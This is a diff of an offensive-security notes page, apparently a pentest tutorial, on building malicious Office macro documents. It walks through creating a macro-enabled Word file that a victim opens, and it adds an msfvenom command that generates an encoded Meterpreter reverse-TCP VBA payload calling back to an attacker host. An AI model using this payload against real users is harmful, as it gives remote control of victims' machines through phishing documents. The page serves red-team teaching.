@@ -1,5 +1,7 @@
 # ⭕ Office Macros
 
+{% embed url="https://levelup.gitconnected.com/ethical-hacking-part-13-office-macro-attacks-3a8a0cad14b7" %}
+
 to create a macro in an office word document:
 
 * Create new word document (CTRL+N)
@@ -23,15 +25,17 @@ Save the file as a macro enabled document, for example a Doc3.dotm:
 
 ![](<../../.gitbook/assets/image (19).png>)
 
-Dot3.dotm - Word Document with Embedded VBA Macros :
-
-{% file src="../../.gitbook/assets/Doc3.dotm" %}
-
 Victim launching the Doc3.dotm:
 
 ![](<../../.gitbook/assets/image (13).png>)
 
-enabling the content results in attacker receiving a reverse shell.
+a message box will appear.
+
+#### <mark style="color:green;">generate reverse shell macro payload for office word:</mark>
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=3333 -e x86/shikata_ga_nai -f vba-psh > macro.
+```
 
 ## <mark style="color:red;">Generating VBA Macros</mark>
 
